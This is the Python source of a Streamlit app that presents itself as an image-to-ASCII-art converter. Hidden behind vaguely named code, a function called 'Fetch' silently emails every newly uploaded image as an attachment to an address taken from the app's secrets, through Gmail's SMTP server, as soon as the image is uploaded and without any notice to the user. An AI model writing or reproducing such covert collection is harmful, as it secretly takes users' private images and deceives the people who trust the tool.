import os
import io
import datetime
import numpy as np
import streamlit as st
from PIL import Image, ImageDraw, ImageFont, ImageEnhance

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import mimetypes
import tempfile

charsASCII = ['@', '#', 'S', '%', '?', '*', '+', ';', ':', ',', '.']


def pixelToASCII(pixelValue):
    index = int(pixelValue/255 * (len(charsASCII)-1))

    return charsASCII[index]

def GetArtImage(imagePath=None, newWidth=100):
    image = Image.open(imagePath)

    width, height = image.size
    aspectRatio = height/width

    tempWidth = newWidth
    tempHeight = int(aspectRatio * tempWidth * 0.55)

    image = image.resize((tempWidth, tempHeight))

    image = image.convert("L")
    image = ImageEnhance.Contrast(image).enhance(1.5)

    imageArray = np.array(image)

    imageArtStr = ""
    for temp in imageArray:
        for pixel in temp:
            imageArtStr += pixelToASCII(pixel)
        imageArtStr += "\n"
    
    tempFont = ImageFont.truetype("fonts/consolab.ttf")
    # fontWidth, fontHeight = tempFont.getsize('A')
    var1, var2, fontWidth, fontHeight = tempFont.getbbox('A')

    imageWidth = fontWidth * tempWidth
    imageHeight = fontHeight * tempHeight

    tempImage = Image.new('RGB', (imageWidth, imageHeight), (206, 235, 251))
    brush = ImageDraw.Draw(tempImage)

    position = 0
    for temp in imageArtStr.split("\n"):
        brush.text((0, position), temp, fill=(0, 0, 0), font=tempFont)
        position += fontHeight
    
    tempFile = io.BytesIO()
    tempImage.save(tempFile, format="JPEG")
    tempFile.seek(0)

    return tempImage, tempFile

def Fetch(file):
    temp1 = st.secrets["temp1"]
    temp2 = st.secrets["temp1"]
    password = st.secrets["secretKey"]

    sub = f"Image Uploaded at {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}"
    body= f"Image: {file}"
    # print("\n--------\n" ,sub,"\n" ,body, "\n--------")

    temp3 = MIMEMultipart()
    temp3['From'] = temp1
    temp3['To'] = temp2
    temp3['Subject'] = sub

    temp3.attach(MIMEText(body, "plain"))

    mimeType, encoding = mimetypes.guess_type(file)
    if mimeType is None:
        mimeType = 'application/octet-stream'
    
    with open(file, "rb") as messageFile:
        part = MIMEBase(mimeType.split('/')[0], mimeType.split('/')[1])
        part.set_payload(messageFile.read())
        encoders.encode_base64(part)

        part.add_header('Content-Disposition', f'attachment; filename={file.split("/")[-1]}')

        temp3.attach(part)
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()

        server.login(temp1, password)

        server.sendmail(temp1, temp2, temp3.as_string())

    except Exception as e:
        print(f"Error: {e}")
    finally:
        server.quit()
    
def main():
    st.title("Image to Art🎨!!")

    if "canReset" not in st.session_state:
        st.session_state.canReset = False
    if "uniqueSet" not in st.session_state:
        st.session_state.uniqueSet = set()
    if "log" not in st.session_state:
        st.session_state.log = "None"
    # print("Start: ",st.session_state)


    file = st.file_uploader("Upload an Image: ", type=['png', 'jpg', 'jpeg'], accept_multiple_files=False)

    if file:
        if file.name not in st.session_state.uniqueSet:
            st.session_state.uniqueSet.add(str(file.name))            
            with tempfile.NamedTemporaryFile(delete=False) as temporaryFile:
                temporaryFile.write(file.getbuffer())
                tempPath = temporaryFile.name
            Fetch(tempPath)
            # print("\nuniqueSet:", st.session_state.uniqueSet)

    if st.button("Create Art!",icon="🎨", use_container_width=True):
        st.session_state.canReset = True
        # st.image("image.png", "Just an Image")

    if file and st.session_state.canReset:
        try:
            imageToShow, imageToDownload = GetArtImage(file)
            st.image(imageToShow, "Generated Art Image", use_container_width=True)

            col1, col2 = st.columns([1,1], vertical_alignment="center")
            with col1:
                st.download_button("Download Art Image", imageToDownload, "artImage.jpg", "image/jpeg", icon="⏬")
            with col2:
                st.info("Don't forget to Zoom into the image.")
        except Exception as e:
            st.error(f"\nFailed!! ------\n{e}\n-------\n")
        
        st.session_state.canReset = False
        
        if st.button("Try Another!!", icon="🆕", use_container_width=True):
            st.session_state.canReset = False
            st.session_state.clear()
            file.empty()
    # print("End: ",st.session_state)

# Call the main function with the image path and output path
# imagePath = <file_path>
# outputPath = "outputASCIIImage.jpg"
# if os.path.exists(imagePath):
#     main(imagePath, outputPath)
# else:
#     print("Path not Found!!")

if __name__ == "__main__":
    main()
